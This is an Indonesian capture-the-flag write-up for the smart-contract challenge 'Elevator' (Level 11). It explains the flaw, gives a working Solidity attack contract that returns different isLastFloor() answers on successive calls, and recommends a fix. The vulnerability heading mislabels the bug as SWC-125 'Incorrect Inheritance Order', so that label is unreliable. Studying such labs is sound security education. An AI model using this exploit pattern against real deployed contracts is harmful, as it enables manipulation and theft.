## Elevator — Level 11

### Alur Logika Contract
pada contract ini aku membaca suatu lelevator yang tidak dapat ke lantai paling atas karena ketika mencapai lantai paling atas akan berada di lantai paling terakgti dan itu tidak mungkin terjadi karena 2 kali veriv yang akan muncul hasil nya sama 

### Vulnerability
Nama: SWC-125: Incorrect Inheritance Order
Penjelasan:Reliance on untrusted external contract" contract Elevator mempercayai implementasi isLastFloor() dari contract luar tanpa validasi.

### Impact
penyerang dapat ke lantai paling atas karena dapan mengubah hasil dari dua verifikasi yang berbeda

### Cara Eksploit
kita menggunakan contract penyerang untuk berinteraksi dengan contract korban agar dapat melakukan verifikasi yang berbeda antara yang pertama dan ke dua 

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

interface IElevator {
    function goTo(uint256 _floor) external;
}

// PERBAIKAN 1: Tambahkan 'is Building' di sini
contract elevatorAttack is Building { 
    IElevator public targetContract; 
    bool public called = false;

    constructor(address _elevator) {
        targetContract = IElevator(_elevator);
    }

    function isLastFloor(uint256) external override returns (bool) {
        if (!called) {
            called = true;  // pertama kali dipanggil → return false
            return false;
        }
        return true;        // kedua kali dipanggil → return true
    }

    function attackGoto() public {
        // PERBAIKAN 2: Pastikan titik koma berada di akhir baris yang sama
        targetContract.goTo(1);
    }
}


### Rekomendasi Fix
Fix: Jangan andalkan contract eksternal untuk menentukan 
state kritis. Implementasikan logika isLastFloor() 
langsung di dalam contract Elevator, bukan di contract luar 
yang bisa dimanipulasi.